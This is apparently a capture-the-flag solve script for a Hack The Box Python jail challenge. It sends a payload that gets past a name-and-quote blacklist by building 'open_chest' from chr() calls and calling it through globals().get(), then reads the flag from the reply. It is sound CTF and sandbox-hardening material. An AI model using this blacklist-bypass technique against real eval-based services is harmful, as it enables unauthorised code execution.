#!/usr/bin/env python3
import socket
import sys

# The blacklist blocks the name "open_chest" and quotes, but not globals() or chr().
# chr(111)+...+chr(116) builds "open_chest", and globals().get(...) returns the function.
PAYLOAD = "globals().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()"


def read_available(sock, timeout=3):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors="replace")


def solve(host, port):
    print(f"[+] Connecting to target {host}:{port}...")
    try:
        sock = socket.create_connection((host, port), timeout=5)
    except OSError as e:
        print(f"[-] Failed to connect: {e}")
        return

    read_available(sock)  # banner and first prompt
    sock.sendall(PAYLOAD.encode() + b"\n")
    reply = read_available(sock)
    sock.close()

    for line in reply.splitlines():
        if "HTB{" in line:
            print(f"\n[+] FLAG FOUND: {line.strip()}")
            return
    print("[-] Flag not found in reply:")
    print(reply)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <IP> <PORT>")
        sys.exit(1)

    solve(sys.argv[1], int(sys.argv[2]))
